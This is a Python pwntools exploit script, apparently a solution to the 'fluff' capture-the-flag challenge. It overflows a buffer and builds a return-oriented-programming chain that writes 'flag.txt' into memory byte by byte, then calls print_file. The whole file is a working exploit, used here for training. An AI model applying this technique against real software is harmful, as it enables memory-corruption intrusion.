#! /usr/bin/env python
from pwn import *

program = "./fluff"
proc = process(program)

elf_prog = ELF(program)

print_file = elf_prog.plt['print_file'] # 0x400510

xlat = elf_prog.symbols['questionableGadgets'] # xlat   BYTE PTR ds:[rbx] ; ret # 0x400628
# xlat BYTE PTR ds:[rbx] : PTR[rbx + al] >>> al
# xlat set value in memory location [rbx+al] to al register
bextr = xlat + 2 # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
# bextr rbx, rcx, rdx, use rdx as control, low half bits control index, and high half bits control length, then use rdx index and length
# to copy rcx value to rbx, since rcx and rdx can be controled, we can control rbx value.
# bextr rbx, rcx, rdx : rcx[rdx[low]:rdx[high]] >>> rbx
stos = xlat + 17 # stosb byte ptr [rdi], al; ret;
# stosb store al value to memory location if [rdi]
# stosb byte ptr [rdi], al : al >>> ptr[rdi]
bss = elf_prog.bss(8) #0x601038
#.bss section address
gadget1 = 0x04006a3 # pop rdi ; ret
gadget2 = 0x0400610 # mov eax, 0; pop rbp; ret;
# gadget2 clean value in al
#character of "flag.txt" individually in memory section
f = 0x4005f6
l = 0x4003c1
a = 0x4003d6
g = 0x4003cf
dot = 0x40024e
t = 0x4003f1
x = 0x400246
# use bextr to control rbx, then use xlat to set rax value, then store al value into rdi address
payload = b'A'*40
# move "flag.txt" each byte individually
# 

# in the first time, clean al value, set rdx value, which will not be modified afterward.
# do bextr, xlat, stosb to set al value 'f' into memory location in .bss section.
payload += p64(bextr) + p64(0x20002000) + p64(f-0x3ef2) + p64(gadget2) + p64(0x0) + p64(xlat) + p64(gadget1) + p64(bss) + p64(stos)
# do bextr, xlat, stosb to set al value 'l' into memory location in .bss section, value of al in previous section should be cleaned by substracting the value before. 
payload += p64(bextr+1) + p64(l-0x3ef2-ord('f')) + p64(xlat) + p64(gadget1) + p64(bss+1) + p64(stos)
payload += p64(bextr+1) + p64(a-0x3ef2-ord('l')) + p64(xlat) + p64(gadget1) + p64(bss+2) + p64(stos)
payload += p64(bextr+1) + p64(g-0x3ef2-ord('a')) + p64(xlat) + p64(gadget1) + p64(bss+3) + p64(stos)
payload += p64(bextr+1) + p64(dot-0x3ef2-ord('g')) + p64(xlat) + p64(gadget1) + p64(bss+4) + p64(stos)
payload += p64(bextr+1) + p64(t-0x3ef2-ord('.')) + p64(xlat) + p64(gadget1) + p64(bss+5) + p64(stos)
# t is already set in al, then just store it to bss section directly.
payload += p64(gadget1) + p64(bss+7) + p64(stos)
payload += p64(bextr+1) + p64(x-0x3ef2-ord('t')) + p64(xlat) + p64(gadget1) + p64(bss+6) + p64(stos)

# set "flag.txt" address in bss into rdi, and jump to print_file function.
payload += p64(gadget1) + p64(bss) + p64(print_file)
print(payload)

proc.recvuntil("> ")
proc.sendline(payload)
proc.interactive()
